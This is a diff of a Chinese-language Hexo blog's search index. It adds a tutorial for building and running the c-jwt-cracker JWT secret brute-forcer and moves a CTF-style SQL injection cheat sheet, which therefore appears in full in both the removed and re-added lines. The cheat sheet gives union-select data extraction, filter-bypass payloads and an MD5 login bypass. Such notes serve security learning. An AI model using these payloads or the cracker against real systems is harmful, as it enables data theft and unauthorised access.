@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>jwtcrack(kali)</title>
+      <link href="/2023/11/30/jwtcrack/"/>
+      <url>/2023/11/30/jwtcrack/</url>
+      
+        <content type="html"><![CDATA[<h1 id="jwtcrack"><a href="#jwtcrack" class="headerlink" title="jwtcrack"></a>jwtcrack</h1><p>此工具对于python用户登录时构造的用户信息jwt加密有爆破密码的作用。</p><h2 id="安装jwtcrack"><a href="#安装jwtcrack" class="headerlink" title="安装jwtcrack"></a>安装jwtcrack</h2><p>使用以下命令直接从github上下载下来源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker</span><br></pre></td></tr></table></figure><p>再安装gcc编译环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install make</span><br></pre></td></tr></table></figure><p>工具源码文件夹在任意位置即可(如桌面)<br>打开终端浸入文件夹内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c-jwt-cracker</span><br></pre></td></tr></table></figure><p>输入命令make<br>如出现报错则安装该头文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>再次运行make，编译成功。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack 字符串</span><br></pre></td></tr></table></figure><p>等待即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>python反序列化</title>
       <link href="/2023/11/15/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
       <url>/2023/11/15/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
@@ -179,31 +204,6 @@
     
     
     <entry>
-      <title>sql注入</title>
-      <link href="/2023/10/19/sql%E6%B3%A8%E5%85%A5/"/>
-      <url>/2023/10/19/sql%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="关于sql注入"><a href="#关于sql注入" class="headerlink" title="关于sql注入"></a>关于sql注入</h1><h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(table_name)from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(column_name)from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span> and table_name=<span class="string">&quot;flag&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> flag from flag),3</span><br></pre></td></tr></table></figure><h2 id="获取flag-1"><a href="#获取flag-1" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span></span><br><span class="line"><span class="string">MD5 不光有ffifdyop 还有 129581926211651571912466741651878684928 也可达同样的效果</span></span><br><span class="line"><span class="string">总之，相当于 select * from admin where password=&#x27;</span><span class="string">&#x27;or ture</span></span><br></pre></td></tr></table></figure><h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from 表名字;#</span></span><br></pre></td></tr></table></figure><h2 id="handler查询字段内文字"><a href="#handler查询字段内文字" class="headerlink" title="handler查询字段内文字"></a>handler查询字段内文字</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;handler 字段名字 open;handler 字段名字 read 字段显示顺序（first）;handler 字段名字 close;#</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; oorrder bbyy 4 ;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,3;%23&amp;password=1234</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,3;%23&amp;password=1234</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database();%23&amp;password=1</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(<span class="built_in">id</span>,username,passwoorrd) frfromom b4bsql;%23&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web2&quot;),3#</span></span><br><span class="line"><span class="string">1&#x27;</span>/**/union/**/select/**/1,(<span class="keyword">select</span>/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=<span class="string">&quot;web2&quot;</span>/**/and/**/table_name=<span class="string">&quot;flag&quot;</span>),3<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span></span><br></pre></td></tr></table></figure><h2 id="过滤＃号用单引号闭合"><a href="#过滤＃号用单引号闭合" class="headerlink" title="过滤＃号用单引号闭合"></a>过滤＃号用单引号闭合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 总结 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 总结 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SSTI</title>
       <link href="/2023/10/19/ssti%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/"/>
       <url>/2023/10/19/ssti%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/</url>
@@ -221,6 +221,31 @@
         <tags>
             
             <tag> SSTI </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入</title>
+      <link href="/2023/10/19/sql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/10/19/sql%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于sql注入"><a href="#关于sql注入" class="headerlink" title="关于sql注入"></a>关于sql注入</h1><h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(table_name)from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(column_name)from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span> and table_name=<span class="string">&quot;flag&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> flag from flag),3</span><br></pre></td></tr></table></figure><h2 id="获取flag-1"><a href="#获取flag-1" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span></span><br><span class="line"><span class="string">MD5 不光有ffifdyop 还有 129581926211651571912466741651878684928 也可达同样的效果</span></span><br><span class="line"><span class="string">总之，相当于 select * from admin where password=&#x27;</span><span class="string">&#x27;or ture</span></span><br></pre></td></tr></table></figure><h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from 表名字;#</span></span><br></pre></td></tr></table></figure><h2 id="handler查询字段内文字"><a href="#handler查询字段内文字" class="headerlink" title="handler查询字段内文字"></a>handler查询字段内文字</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;handler 字段名字 open;handler 字段名字 read 字段显示顺序（first）;handler 字段名字 close;#</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; oorrder bbyy 4 ;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,3;%23&amp;password=1234</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,3;%23&amp;password=1234</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database();%23&amp;password=1</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(<span class="built_in">id</span>,username,passwoorrd) frfromom b4bsql;%23&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web2&quot;),3#</span></span><br><span class="line"><span class="string">1&#x27;</span>/**/union/**/select/**/1,(<span class="keyword">select</span>/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=<span class="string">&quot;web2&quot;</span>/**/and/**/table_name=<span class="string">&quot;flag&quot;</span>),3<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span></span><br></pre></td></tr></table></figure><h2 id="过滤＃号用单引号闭合"><a href="#过滤＃号用单引号闭合" class="headerlink" title="过滤＃号用单引号闭合"></a>过滤＃号用单引号闭合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 总结 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 总结 </tag>
             
         </tags>
       
@@ -433,31 +458,9 @@
     
     
     <entry>
-      <title>关于</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>音乐</title>
-      <link href="/music/index.html"/>
-      <url>/music/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>电影</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
+      <title>categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -477,9 +480,31 @@
     
     
     <entry>
-      <title>categories</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title>电影</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>音乐</title>
+      <link href="/music/index.html"/>
+      <url>/music/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
